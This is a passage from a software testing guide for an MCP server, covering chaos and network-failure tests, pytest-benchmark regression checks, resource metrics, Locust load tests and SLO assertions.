            result = await chaos_enabled(fetch_assignment)
            results.append(result)
        except Exception:
            # Should have fallback mechanism
            fallback = get_cached_data()
            results.append(fallback)
    
    # Should have some successful responses
    assert len(results) > 50
    # All results should be valid (even fallbacks)
    assert all(r is not None for r in results)
```

### Network Partition Testing

```python
# tests/chaos/test_network_partitions.py
import pytest
from unittest.mock import patch
import asyncio

@pytest.mark.asyncio
async def test_database_connection_loss():
    """Verify handling of database connection loss."""
    with patch('asyncpg.connect') as mock_connect:
        # Simulate connection loss mid-operation
        mock_connect.side_effect = ConnectionError("Connection lost")
        
        # Should retry with backoff
        result = await execute_with_retry(
            query="SELECT * FROM assignments",
            max_retries=3
        )
        
        # Verify retry attempts
        assert mock_connect.call_count == 3

@pytest.mark.asyncio
async def test_timeout_handling():
    """Verify proper timeout handling."""
    async def slow_operation():
        await asyncio.sleep(10)  # Exceeds timeout
        return "result"
    
    with pytest.raises(asyncio.TimeoutError):
        await asyncio.wait_for(slow_operation(), timeout=2.0)
```

## Performance Regression Testing

Automated performance benchmarking catches performance regressions.

### Setup with pytest-benchmark

```bash
pip install pytest-benchmark
```

**Basic Benchmarking:**

```python
# tests/performance/test_benchmarks.py
import pytest

def test_assignment_creation_performance(benchmark):
    """Benchmark assignment creation."""
    result = benchmark(
        create_assignment_sync,
        title="Benchmark Test",
        assignee="test@example.com"
    )
    assert result["success"] is True

@pytest.mark.asyncio
async def test_async_benchmark(benchmark):
    """Benchmark async operations."""
    result = await benchmark.pedantic(
        create_assignment,
        args=("Test", "test@example.com"),
        iterations=100,
        rounds=10
    )
    assert result is not None
```

**Run benchmarks:**

```bash
# Run and save baseline
pytest tests/performance/ --benchmark-save=baseline

# Compare against baseline
pytest tests/performance/ --benchmark-compare=baseline

# Fail if regression > 10%
pytest tests/performance/ --benchmark-compare=baseline \
  --benchmark-compare-fail=mean:10%
```

### Custom Performance Metrics

```python
# tests/performance/metrics.py
import time
import psutil
import pytest
from contextlib import contextmanager

@contextmanager
def measure_performance():
    """Context manager for measuring performance."""
    process = psutil.Process()
    
    # Capture baseline
    start_time = time.perf_counter()
    start_memory = process.memory_info().rss / 1024 / 1024  # MB
    start_cpu = process.cpu_percent()
    
    yield
    
    # Capture after execution
    end_time = time.perf_counter()
    end_memory = process.memory_info().rss / 1024 / 1024
    end_cpu = process.cpu_percent()
    
    metrics = {
        "duration_ms": (end_time - start_time) * 1000,
        "memory_delta_mb": end_memory - start_memory,
        "cpu_percent": end_cpu
    }
    
    # Assert performance thresholds
    assert metrics["duration_ms"] < 1000, f"Too slow: {metrics['duration_ms']}ms"
    assert metrics["memory_delta_mb"] < 50, f"Memory leak: {metrics['memory_delta_mb']}MB"

@pytest.mark.asyncio
async def test_bulk_operation_performance():
    """Verify bulk operations meet performance targets."""
    with measure_performance():
        assignments = [
            AssignmentFactory() for _ in range(1000)
        ]
        result = await bulk_create_assignments(assignments)
        assert len(result) == 1000
```

### Load Testing with Locust

```bash
pip install locust
```

**Load Test Definition:**

```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between
import random

class MCPServerUser(HttpUser):
    """Simulate MCP server user load."""
    
    wait_time = between(1, 3)  # Random wait between requests
    
    def on_start(self):
        """Called when user starts."""
        self.client.headers = {
            "Authorization": f"Bearer {self.get_auth_token()}"
        }
    
    @task(3)  # Weight: 3x more frequent than other tasks
    def list_assignments(self):
        """GET /assignments endpoint."""
        self.client.get(
            "/api/v1/assignments",
            params={"limit": 20, "status": "in_progress"}
        )
    
    @task(1)
    def create_assignment(self):
        """POST /assignments endpoint."""
        self.client.post(
            "/api/v1/assignments",
            json={
                "title": f"Load Test Assignment {random.randint(1, 1000)}",
                "assignee": "test@example.com",
                "priority": random.randint(1, 5)
            }
        )
    
    @task(2)
    def get_assignment(self):
        """GET /assignments/:id endpoint."""
        assignment_id = random.choice(self.assignment_ids)
        self.client.get(f"/api/v1/assignments/{assignment_id}")
```

**Run Load Test:**

```bash
# Web UI
locust -f tests/performance/locustfile.py --host=https://api.example.com

# Headless (CI/CD)
locust -f tests/performance/locustfile.py \
  --host=https://staging-api.example.com \
  --users 100 \
  --spawn-rate 10 \
  --run-time 5m \
  --headless \
  --csv=results
```

**Performance SLO Assertions:**

```python
# tests/performance/test_slo.py
import pytest
import json

def test_load_test_slo():
    """Verify load test results meet SLOs."""
    with open("results_stats.json") as f:
        stats = json.load(f)
    
    # Parse results
    assignments_get = stats.get("/api/v1/assignments")
    
    # SLO: P95 latency < 500ms
    assert assignments_get["response_times"]["95th_percentile"] < 500
    
    # SLO: Error rate < 1%
    error_rate = (
        assignments_get["num_failures"] / 
        assignments_get["num_requests"] * 100
    )
    assert error_rate < 1.0
    
    # SLO: Throughput > 100 req/s
    throughput = assignments_get["requests_per_second"]
    assert throughput > 100
```

## Summary

Comprehensive testing ensures MCP server reliability through:

- **Unit Tests**: Test individual tools with mocked dependencies (90%+ coverage)
- **Integration Tests**: Test component interactions and database persistence
- **E2E Tests**: Validate complete user workflows
- **Contract Tests**: Validate protocol compliance and external API contracts
- **Load Tests**: Verify performance under realistic load
- **Security Tests**: Validate authentication, authorization, and input handling
- **CI/CD**: Automated testing on every commit and PR

---

**Next**: Review [Observability](05-observability.md) for monitoring and debugging strategies.
